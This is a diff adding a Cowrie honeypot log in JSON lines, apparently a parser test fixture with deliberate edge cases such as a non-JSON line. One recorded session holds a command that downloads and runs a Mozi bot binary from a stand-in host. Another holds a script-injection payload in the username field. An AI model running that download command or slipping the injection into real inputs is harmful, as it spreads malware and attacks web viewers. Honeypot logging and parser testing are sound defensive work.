@@ -1,0 +1,14 @@
+{"eventid":"cowrie.session.connect","src_ip":"45.95.11.20","src_port":51022,"dst_port":2222,"session":"a1","protocol":"ssh","timestamp":"2026-11-23T10:00:00.000000Z"}
+{"eventid":"cowrie.client.version","version":"SSH-2.0-Go","session":"a1","src_ip":"45.95.11.20","timestamp":"2026-11-23T10:00:01.000000Z"}
+{"eventid":"cowrie.login.failed","username":"root","password":"123456","session":"a1","src_ip":"45.95.11.20","timestamp":"2026-11-23T10:00:02.000000Z"}
+{"eventid":"cowrie.login.failed","username":"admin","password":"admin","session":"a1","src_ip":"45.95.11.20","timestamp":"2026-11-23T10:00:03.000000Z"}
+{"eventid":"cowrie.session.closed","duration":4.1,"session":"a1","src_ip":"45.95.11.20","timestamp":"2026-11-23T10:00:04.000000Z"}
+{"eventid":"cowrie.session.connect","src_ip":"103.4.145.10","src_port":40000,"dst_port":2222,"session":"b2","protocol":"ssh","timestamp":"2026-11-23T11:00:00.000000Z"}
+{"eventid":"cowrie.login.success","username":"root","password":"root","session":"b2","src_ip":"103.4.145.10","timestamp":"2026-11-23T11:00:01.000000Z"}
+{"eventid":"cowrie.command.input","input":"uname -a","session":"b2","src_ip":"103.4.145.10","timestamp":"2026-11-23T11:00:02.000000Z"}
+{"eventid":"cowrie.command.input","input":"cd /tmp; wget http://198.51.100.7/bins/mozi.m; chmod +x mozi.m; ./mozi.m","session":"b2","src_ip":"103.4.145.10","timestamp":"2026-11-23T11:00:03.000000Z"}
+{"eventid":"cowrie.session.file_download","url":"http://185.220.101.45/bins/mozi.m","shasum":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","outfile":"var/lib/cowrie/downloads/e3b0","session":"b2","src_ip":"103.4.145.10","timestamp":"2026-11-23T11:00:04.000000Z"}
+{"eventid":"cowrie.session.connect","src_ip":"192.0.2.55","src_port":1,"dst_port":2223,"session":"c3","protocol":"telnet","timestamp":"2026-11-23T12:00:00.000000Z"}
+{"eventid":"cowrie.session.closed","duration":0.2,"session":"c3","src_ip":"192.0.2.55","timestamp":"2026-11-23T12:00:00.500000Z"}
+not json at all
+{"eventid":"cowrie.login.failed","username":"<script>alert(1)</script>","password":"x","session":"d4","src_ip":"8.8.4.4","protocol":"telnet","timestamp":"2026-11-23T13:00:00.000000Z"}
